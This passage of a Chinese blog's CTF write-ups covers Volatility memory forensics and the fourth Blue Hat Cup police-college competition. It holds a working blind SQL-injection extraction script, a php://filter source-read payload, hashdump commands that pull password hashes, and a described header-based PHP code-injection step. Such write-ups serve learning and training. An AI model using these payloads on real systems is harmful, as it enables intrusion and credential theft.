mem.raw --profile<span class="token operator">=</span>Win7SP1x86 memdump -p 3552 -D ./ <span class="token comment" spellcheck="true">#dump内存文件</span></code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194819.png" srcset="/img/loading.gif" alt=""></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193213.png" srcset="/img/loading.gif" alt=""></p><pre class=" language-bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 filescan <span class="token operator">|</span><span class="token function">grep</span> notepad <span class="token comment" spellcheck="true">#查找硬盘文件</span>volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 dumpfiles -Q 0x000000001de89cb8 -D ./ <span class="token comment" spellcheck="true">#dump文件</span></code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193234.png" srcset="/img/loading.gif" alt=""></p><pre class=" language-bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 hivelist <span class="token comment" spellcheck="true">#获取system和SAM地址</span></code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193303.png" srcset="/img/loading.gif" alt=""></p><pre class=" language-bash"><code class="language-bash">volatility -f mem.raw --profile<span class="token operator">=</span>Win7SP1x86 hashdump -y 0x8681a2d8 -s 0x8fb67470  <span class="token comment" spellcheck="true">#打印hash值</span></code></pre><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193324.png" srcset="/img/loading.gif" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    
    <categories>
      
      <category>取证</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>第四届蓝帽杯线上赛部分wp</title>
    <link href="/ctf/di-si-jie-lan-mao-bei-xian-shang-sai-bu-fen-wp/"/>
    <url>/ctf/di-si-jie-lan-mao-bei-xian-shang-sai-bu-fen-wp/</url>
    
    <content type="html"><![CDATA[<h1 id="第四届“蓝帽杯”全国警校网络安全技能大赛WriteUp"><a href="#第四届“蓝帽杯”全国警校网络安全技能大赛WriteUp" class="headerlink" title="第四届“蓝帽杯”全国警校网络安全技能大赛WriteUp"></a><strong>第四届“蓝帽杯”全国警校网络安全技能大赛WriteUp</strong></h1><p>这次比赛应该可以顺利进入决赛，每次打比赛都是一次成长的经历吧，感觉到自己很多方面的不足，还要继续加油努力啊！</p><h2 id="0x00-题目名称：签到"><a href="#0x00-题目名称：签到" class="headerlink" title="0x00 题目名称：签到"></a><strong>0x00</strong> 题目名称：签到</h2><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p><strong>010editor</strong>打开，发现是gif</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193414.jpg" srcset="/img/loading.gif" alt=""></p><p>想到gif多帧，分离gif 网址：<a href="https://zh.bloggif.com/gif-extract" target="_blank" rel="noopener">https://zh.bloggif.com/gif-extract</a></p><p>得到两张gif</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193435.jpg" srcset="/img/loading.gif" alt=""></p><p><strong>分别使用</strong>Stegsolve打开，合并flag</p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193512.jpg" srcset="/img/loading.gif" style="zoom:50%;"><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193520.jpg" srcset="/img/loading.gif" style="zoom:50%;"><hr><h3 id="FLAG值："><a href="#FLAG值：" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p><strong>flag{we1c0m3}</strong></p><h2 id="0x01题目名称：zuc"><a href="#0x01题目名称：zuc" class="headerlink" title="0x01题目名称：zuc"></a><strong>0x01</strong>题目名称：zuc</h2><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p><strong>经过搜索引擎查询，zuc是祖冲之算法，找到工具GmSSL</strong></p><p><a href="https://github.com/guanzhi/GmSSL" target="_blank" rel="noopener"><strong>https://github.com/guanzhi/GmSSL</strong></a></p><p><strong>命令：gmssl zuc -d -in flag.zuc</strong></p><p><strong>输入key：chunqiugame</strong></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193606.jpg" srcset="/img/loading.gif" alt=""></p><h3 id="FLAG值：-1"><a href="#FLAG值：-1" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p><strong>flag{228cca62-fddc-44ac-8173-c99be4c40a41}</strong></p><h2 id="0x02-题目名称：Inclusion"><a href="#0x02-题目名称：Inclusion" class="headerlink" title="0x02 题目名称：Inclusion"></a>0x02 题目名称：Inclusion</h2><h3 id="操作内容：-2"><a href="#操作内容：-2" class="headerlink" title="操作内容："></a>操作内容：</h3><p>根据提示猜想可能是vim文件泄露</p><p><a href="http://eci-2ze471n7exckwg5q0jpq.cloudeci1.ichunqiu.com/.index.php.swp" target="_blank" rel="noopener"><strong>http://eci-2ze471n7exckwg5q0jpq.cloudeci1.ichunqiu.com/.index.php.swp</strong></a></p><p><strong>下载源码，打开：vim –r index.php.swp</strong></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193626.jpg" srcset="/img/loading.gif" alt=""></p><p><strong>审计后，使用burp抓包，在http请求头中插入php代码,然后包含res文件进行命令执行,拿到flag</strong></p><h3 id="FLAG值：-2"><a href="#FLAG值：-2" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p><strong>flag{964d75a2-f0af-4170-9a4a-0d104ceead9f}</strong></p><h2 id="0x03-题目名称：sudo"><a href="#0x03-题目名称：sudo" class="headerlink" title="0x03 题目名称：sudo"></a><strong>0x03 题目名称：sudo</strong></h2><h3 id="操作内容：-3"><a href="#操作内容：-3" class="headerlink" title="操作内容："></a><strong>操作内容：</strong></h3><h5 id="nc-连接发现数独解密，使用python脚本"><a href="#nc-连接发现数独解密，使用python脚本" class="headerlink" title="nc 连接发现数独解密，使用python脚本"></a>nc 连接发现数独解密，使用python脚本</h5><p><strong>将数独复制1.txt中，使用python解密答案</strong></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193810.jpg" srcset="/img/loading.gif" alt=""></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193949.jpg" srcset="/img/loading.gif" alt=""></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> timet0 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">point</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>x <span class="token operator">=</span> x        self<span class="token punctuation">.</span>y <span class="token operator">=</span> y        self<span class="token punctuation">.</span>available <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">rowNum</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>    row <span class="token operator">=</span> set<span class="token punctuation">(</span>sudoku<span class="token punctuation">[</span>p<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">:</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    row<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> row  <span class="token comment" spellcheck="true"># set type</span><span class="token keyword">def</span> <span class="token function">colNum</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>    col <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    length <span class="token operator">=</span> len<span class="token punctuation">(</span>sudoku<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>p<span class="token punctuation">.</span>x<span class="token punctuation">,</span> length<span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        col<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sudoku<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    col <span class="token operator">=</span> set<span class="token punctuation">(</span>col<span class="token punctuation">)</span>    col<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> col  <span class="token comment" spellcheck="true"># set type</span><span class="token keyword">def</span> <span class="token function">blockNum</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>    block_x <span class="token operator">=</span> p<span class="token punctuation">.</span>x <span class="token operator">//</span> <span class="token number">3</span>    block_y <span class="token operator">=</span> p<span class="token punctuation">.</span>y <span class="token operator">//</span> <span class="token number">3</span>    block <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    start <span class="token operator">=</span> block_y <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">+</span> block_x <span class="token operator">*</span> <span class="token number">3</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>start<span class="token punctuation">,</span> start <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        block<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sudoku<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>start <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">,</span> start <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        block<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sudoku<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>start <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">,</span> start <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        block<span class="token punctuation">.</span>append<span class="token punctuation">(</span>sudoku<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    block <span class="token operator">=</span> set<span class="token punctuation">(</span>block<span class="token punctuation">)</span>    block<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> block  <span class="token comment" spellcheck="true"># set type</span><span class="token keyword">def</span> <span class="token function">initPoint</span><span class="token punctuation">(</span>sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>    pointList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    length <span class="token operator">=</span> len<span class="token punctuation">(</span>sudoku<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> sudoku<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> point<span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">9</span><span class="token punctuation">,</span> i <span class="token operator">//</span> <span class="token number">9</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> j <span class="token operator">not</span> <span class="token keyword">in</span> rowNum<span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span> <span class="token operator">and</span> j <span class="token operator">not</span> <span class="token keyword">in</span> colNum<span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span> <span class="token operator">and</span> j <span class="token operator">not</span> <span class="token keyword">in</span> blockNum<span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>                    p<span class="token punctuation">.</span>available<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            pointList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">return</span> pointList<span class="token keyword">def</span> <span class="token function">tryInsert</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>    availNum <span class="token operator">=</span> p<span class="token punctuation">.</span>available    <span class="token keyword">for</span> v <span class="token keyword">in</span> availNum<span class="token punctuation">:</span>        p<span class="token punctuation">.</span>value <span class="token operator">=</span> v        <span class="token keyword">if</span> check<span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>            sudoku<span class="token punctuation">[</span>p<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">+</span> p<span class="token punctuation">.</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>value            <span class="token keyword">if</span> len<span class="token punctuation">(</span>pointList<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>                t1 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>                useTime <span class="token operator">=</span> t1 <span class="token operator">-</span> t0                showSudoku<span class="token punctuation">(</span>sudoku<span class="token punctuation">)</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>sudoku<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>sudoku<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nuse Time: %f s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>useTime<span class="token punctuation">)</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span>            p2 <span class="token operator">=</span> pointList<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>            tryInsert<span class="token punctuation">(</span>p2<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span>            sudoku<span class="token punctuation">[</span>p2<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">+</span> p2<span class="token punctuation">.</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>            sudoku<span class="token punctuation">[</span>p<span class="token punctuation">.</span>y <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">+</span> p<span class="token punctuation">.</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>            p2<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token number">0</span>            pointList<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p2<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> p<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'not assign value to point p!!'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> p<span class="token punctuation">.</span>value <span class="token operator">not</span> <span class="token keyword">in</span> rowNum<span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span> <span class="token operator">and</span> p<span class="token punctuation">.</span>value <span class="token operator">not</span> <span class="token keyword">in</span> colNum<span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span> <span class="token operator">and</span> p<span class="token punctuation">.</span>value <span class="token operator">not</span> <span class="token keyword">in</span> blockNum<span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">showSudoku</span><span class="token punctuation">(</span>sudoku<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%d '</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sudoku<span class="token punctuation">[</span>j <span class="token operator">*</span> <span class="token number">9</span> <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    sudoku <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'2.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>    txt <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> txt<span class="token punctuation">:</span>        line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">' \n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> ch <span class="token keyword">in</span> line<span class="token punctuation">:</span>            <span class="token keyword">if</span> ch <span class="token operator">==</span> <span class="token string">'#'</span><span class="token punctuation">:</span>                sudoku<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                sudoku<span class="token punctuation">.</span>append<span class="token punctuation">(</span>int<span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">)</span>    pointList <span class="token operator">=</span> initPoint<span class="token punctuation">(</span>sudoku<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># showSudoku(sudoku)</span>    <span class="token comment" spellcheck="true"># print('\n')</span>    p <span class="token operator">=</span> pointList<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>    tryInsert<span class="token punctuation">(</span>p<span class="token punctuation">,</span> sudoku<span class="token punctuation">)</span></code></pre><p><strong>经过三次数独，输入token拿到flag</strong></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111193901.jpg" srcset="/img/loading.gif" alt=""></p><h3 id="FLAG值：-3"><a href="#FLAG值：-3" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p><strong>flag{42aaeae409e40a3f4bf245d9540ace98}</strong></p><h2 id="0x04-题目名称：easiestSQLi"><a href="#0x04-题目名称：easiestSQLi" class="headerlink" title="0x04 题目名称：easiestSQLi"></a><strong>0x04 题目名称：easiestSQLi</strong></h2><h3 id="操作内容"><a href="#操作内容" class="headerlink" title="操作内容:"></a>操作内容:</h3><p>首先找注入点：<code>1||1 1^1</code></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194050.png" srcset="/img/loading.gif" alt=""></p><p>1^0返回YES：</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194104.png" srcset="/img/loading.gif" alt=""></p><p>分析出来是整形注入</p><p>根据:</p><ul><li>函数if (1=1,0,1)当1=1时 整体=0</li><li>ascii (substr (“abc”,1,1))=ascii (“a”)=97</li></ul><p>构造出<code>1^if (ascii (substr ("abc",1,1) ) = 97,0,1 )</code></p><p>这样从flag表、flag列里面查出来的字符串分别是 f l a g 这些字母时返回 0 与 1 异或回显是<code>YES~</code></p><p>根据思路写出Python脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://eci-2zef68uxg0ojphcgiy5i.cloudeci1.ichunqiu.com/?id=1^"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>  <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    u<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"if(ascii(substr((select(flag)from(flag)),{0},1))={1},3,1)"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"YES~"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>      flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>      <span class="token keyword">break</span></code></pre><p>运行后得到flag：</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194203.png" srcset="/img/loading.gif" alt=""></p><h3 id="FLAG值：-4"><a href="#FLAG值：-4" class="headerlink" title="FLAG值："></a><strong>FLAG值：</strong></h3><p>flag{365085b5-0fa3-4744-baec-690043267667}</p><h2 id="0x05题目名称：Soitgoes"><a href="#0x05题目名称：Soitgoes" class="headerlink" title="0x05题目名称：Soitgoes"></a><strong>0x05题目名称：Soitgoes</strong></h2><h3 id="操作内容-1"><a href="#操作内容-1" class="headerlink" title="操作内容:"></a>操作内容:</h3><p>首先查看网页源码：</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194234.png" srcset="/img/loading.gif" alt=""></p><p>提示php://filter文件读取伪协议 获取try.php源码：</p><p><code>?file=php://filter/read=convert.base64-encode/resource=try.php</code></p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194327.png" srcset="/img/loading.gif" alt=""></p><p>把得到的base64进行解码：</p><p><img src="https://mmsyblog-img.oss-cn-beijing.aliyuncs.com/img/20210111194349.png" srcset="/img/loading.gif" alt=""></p><p>try.php源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Seri</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$alize</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$alize</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">alize</span> <span class="token operator">=</span> <span class="token variable">$alize</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">alize</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$t1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$t2</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Another construction!!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t1</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t1</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">t2</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">f</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输出源码</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>同理index.php源码：</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>IE<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token 